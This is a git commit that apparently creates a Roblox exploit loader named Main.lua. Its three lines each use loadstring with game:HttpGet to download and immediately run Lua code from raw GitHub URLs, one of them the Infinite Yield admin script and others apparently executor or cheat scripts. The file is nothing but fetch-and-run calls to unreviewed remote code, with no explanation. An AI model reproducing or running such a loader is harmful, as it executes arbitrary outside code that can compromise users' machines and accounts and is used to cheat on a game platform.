73a54777ae0b67e75ab68762e639339f805e13c4
Zeerunsyou <155188630+Zeerunsyou@users.noreply.github.com>
2025-08-31 12:04:57 -0400

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/danielpfsg3-dev/Corics/refs/heads/main/main.lua"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/latest.lua'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuvic123/xeno/refs/heads/main/Skidov3-Xeno"))()
